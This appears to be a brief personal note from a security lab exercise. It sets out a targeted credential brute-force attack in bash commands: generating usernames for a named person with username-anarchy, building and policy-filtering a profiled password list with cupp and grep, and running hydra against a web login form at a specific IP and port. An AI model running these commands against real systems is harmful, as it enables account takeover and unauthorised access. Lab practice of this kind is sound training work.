___

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

```bash
cupp -i
```

Filter that password list to match that policy,
```bash
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```


```bash
hydra -L username-anarchy/jane_smith_usernames.txt -P jane-filtered.txt 94.237.56.137 -s 33347 -f  
http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

![[Pasted image 20241004150612.png]]

